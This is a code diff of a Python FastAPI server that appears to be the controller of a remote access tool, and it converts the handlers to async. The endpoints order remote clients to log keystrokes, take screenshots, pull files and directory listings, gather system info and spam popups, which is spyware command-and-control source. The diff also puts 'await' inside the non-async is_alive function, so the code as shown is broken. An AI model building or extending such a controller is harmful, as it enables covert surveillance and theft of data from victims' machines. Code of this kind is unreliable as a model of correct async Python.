@@ -23,13 +23,13 @@ server = configurator.parse(args.config)
 
 
 @app.get("/")
-def make_command_request(request: SendCommandRequest) -> SendCommandResponse:
+async def make_command_request(request: SendCommandRequest) -> SendCommandResponse:
     return server.handle_send_command(request)
 
 
 @app.put("/popup")
 async def send_popup_command(client_id: str, message: str) -> BasicResponse:
-    return make_command_request(
+    return await make_command_request(
         SendCommandRequest(
             header=RequestHeader(
                 client_id=client_id,
@@ -48,7 +48,7 @@ async def send_popup_command(client_id: str, message: str) -> BasicResponse:
 
 @app.put("/popup-spam")
 async def send_popup_spam_command(client_id: str, message: str) -> BasicResponse:
-    return make_command_request(
+    return await make_command_request(
         SendCommandRequest(
             header=RequestHeader(
                 client_id=client_id,
@@ -68,7 +68,7 @@ async def send_popup_spam_command(client_id: str, message: str) -> BasicResponse
 
 @app.get("/screenshot")
 async def send_screenshot_command(client_id: str) -> BasicResponse:
-    return make_command_request(
+    return await make_command_request(
         SendCommandRequest(
             header=RequestHeader(
                 client_id=client_id,
@@ -81,7 +81,7 @@ async def send_screenshot_command(client_id: str) -> BasicResponse:
 
 @app.get("/keylog")
 async def send_keylog_command(client_id: str, duration: int) -> BasicResponse:
-    return make_command_request(
+    return await make_command_request(
         SendCommandRequest(
             header=RequestHeader(
                 client_id=client_id,
@@ -94,7 +94,7 @@ async def send_keylog_command(client_id: str, duration: int) -> BasicResponse:
 
 @app.get("/get-system-info")
 async def send_get_system_info_command(client_id: str) -> BasicResponse:
-    return make_command_request(
+    return await make_command_request(
         SendCommandRequest(
             header=RequestHeader(
                 client_id=client_id,
@@ -107,7 +107,7 @@ async def send_get_system_info_command(client_id: str) -> BasicResponse:
 
 @app.get("/getfile")
 async def send_getfile_command(client_id: str, path: str) -> BasicResponse:
-    return make_command_request(
+    return await make_command_request(
         SendCommandRequest(
             header=RequestHeader(
                 client_id=client_id,
@@ -120,7 +120,7 @@ async def send_getfile_command(client_id: str, path: str) -> BasicResponse:
 
 @app.get("/dirlist")
 async def send_dirlist_command(client_id: str, path: str, tree: bool = True, depth: Optional[int] = None) -> BasicResponse:
-    return make_command_request(
+    return await make_command_request(
         SendCommandRequest(
             header=RequestHeader(
                 client_id=client_id,
@@ -135,7 +135,7 @@ async def send_dirlist_command(client_id: str, path: str, tree: bool = True, dep
 
 @app.put("/play-sound")
 async def send_play_sound_command(client_id: str, sound_buffer: UploadFile = File(...)) -> BasicResponse:
-    return make_command_request(
+    return await make_command_request(
         SendCommandRequest(
             header=RequestHeader(
                 client_id=client_id,
@@ -152,7 +152,7 @@ async def send_play_sound_command(client_id: str, sound_buffer: UploadFile = Fil
 
 @app.get("/is-alive")
 def is_alive(client_id: str) -> BasicResponse:
-    return server.is_alive(client_id)
+    return await server.is_alive(client_id)
 
 
 if __name__ == '__main__':
